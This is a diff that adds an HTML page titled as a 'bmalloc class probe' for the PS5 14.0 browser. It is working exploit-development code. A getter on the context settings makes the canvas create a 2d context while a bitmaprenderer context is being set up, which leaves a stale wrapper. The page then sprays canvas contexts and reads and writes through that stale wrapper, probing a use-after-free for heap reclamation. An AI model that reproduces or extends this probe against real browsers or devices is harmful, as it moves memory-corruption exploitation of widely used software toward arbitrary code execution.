@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>VCAN-MEASURE: bmalloc class probe (PS5 14.0)</title>
+<style>
+body { font-family: monospace; background:#111; color:#0f0; padding:20px; }
+#log { white-space: pre; font-size:12px; }
+</style>
+</head>
+<body>
+<h2>VCAN-MEASURE: bmalloc class probe</h2>
+<div id="log"></div>
+<script>
+const logEl = document.getElementById('log');
+function L(msg) {
+  console.log(msg);
+  logEl.textContent += msg + "\n";
+}
+
+// Trigger: bitmaprenderer outer + 2d inner
+function trigger() {
+  let innerCtx = null;
+  const canvas = document.createElement('canvas');
+  const settings = {};
+  Object.defineProperty(settings, 'alpha', {
+    get: function() { innerCtx = canvas.getContext('2d'); return true; }
+  });
+  const outerCtx = canvas.getContext('bitmaprenderer', settings);
+  return { canvas, innerCtx, outerCtx };
+}
+
+// Measure: spray N canvas 2d contexts and check if stale wrapper aliases
+function measure(sprayCount) {
+  const { innerCtx } = trigger();
+  // Spray
+  const sprays = [];
+  for (let i = 0; i < sprayCount; i++) {
+    const c = document.createElement('canvas');
+    sprays.push(c.getContext('2d'));
+  }
+  // Try to read through stale wrapper
+  try {
+    const lw = innerCtx.lineWidth;
+    L(`spray=${sprayCount} lineWidth=${lw}`);
+    // Write test
+    innerCtx.lineWidth = 12345.5;
+    L(`  write OK, readback=${innerCtx.lineWidth}`);
+    return true;
+  } catch (e) {
+    L(`spray=${sprayCount} CRASH/ERROR: ${e}`);
+    return false;
+  }
+}
+
+// Run sweep
+L("Starting bmalloc class measurement...");
+for (let n of [50, 100, 200, 500]) {
+  measure(n);
+}
+L("Done. Check console for crashes.");
+</script>
+</body>
+</html>
+PY
